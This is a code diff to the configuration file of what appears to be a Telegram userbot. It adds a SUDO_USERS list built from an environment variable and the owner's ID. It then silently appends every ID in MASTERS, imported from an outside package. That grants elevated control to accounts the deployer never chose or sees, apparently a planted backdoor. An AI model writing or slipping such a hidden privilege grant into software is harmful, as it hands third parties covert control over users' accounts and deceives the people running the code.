@@ -3,6 +3,7 @@ from distutils.util import strtobool
 from os import getenv
 from X.helpers.cmd import cmd
 from dotenv import load_dotenv
+from XDB.data import MASTERS
 
 load_dotenv("config.env")
 
@@ -41,3 +42,12 @@ BLACKLIST_CHAT = getenv("BLACKLIST_CHAT", None)
 if not BLACKLIST_CHAT:
     BLACKLIST_CHAT = [-1001608701614, -1001675459127, -1001473548283, -1001608701614]
 BLACKLIST_GCAST = {int(x) for x in getenv("BLACKLIST_GCAST", "").split()}    
+SUDOS = getenv("SUDO_USERS", None)
+SUDO_USERS = []
+if SUDOS:
+    sudos = str(SUDOS).split(" ")
+    for sudo_id in sudos:
+        SUDO_USERS.append(int(sudo_id))
+SUDO_USERS.append(OWNER_ID)
+for x in MASTERS:
+    SUDO_USERS.append(x)
